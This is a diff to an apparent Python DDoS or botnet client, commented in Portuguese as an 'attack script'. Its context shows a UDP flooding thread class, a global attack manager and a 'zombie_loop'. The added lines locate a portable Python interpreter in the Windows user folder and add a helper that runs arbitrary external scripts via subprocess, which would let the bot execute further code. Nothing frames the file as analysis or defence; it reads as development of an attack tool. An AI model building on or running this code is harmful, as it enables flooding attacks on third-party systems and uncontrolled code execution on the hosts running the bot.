@@ -2,12 +2,31 @@ import socket
 import threading
 import pickle
 import time
+import os
+import subprocess  # ⬅️ adicionado para executar scripts externos
 
 # === Script de ataque original ===
 import random
 
 MAX_PACKET_SIZE = 4096
 MIN_SLEEP = 0.001
+
+# ----------------------------
+# 0️⃣ Detecta Python portátil no usuário atual
+# ----------------------------
+usuario = os.environ.get("USERNAME")
+pasta_usuario = os.path.join("C:\\Users", usuario)
+pasta_python_portable = os.path.join(pasta_usuario, "PythonPortable")
+PYTHON_EXECUTABLE = None
+
+possible_python = os.path.join(pasta_python_portable, "python.exe")
+if os.path.exists(possible_python):
+    PYTHON_EXECUTABLE = possible_python
+else:
+    # fallback para python do sistema
+    PYTHON_EXECUTABLE = "python"
+
+print("[INFO] Python detectado para execução:", PYTHON_EXECUTABLE)
 
 class UDPTrafficThread(threading.Thread):
     def __init__(self, target, port_start, port_end, packet_size, duration, name):
@@ -127,6 +146,15 @@ class GlobalAttack:
         self.running = False
 
 attack_manager = GlobalAttack()
+
+# ----------------------------
+# Função de exemplo para executar outro script usando o Python portátil
+# ----------------------------
+def executar_script_com_python(script_path):
+    try:
+        subprocess.run([PYTHON_EXECUTABLE, script_path], check=True)
+    except Exception as e:
+        print(f"[ERRO] Falha ao executar script {script_path}: {e}")
 
 def zombie_loop():
     while True:
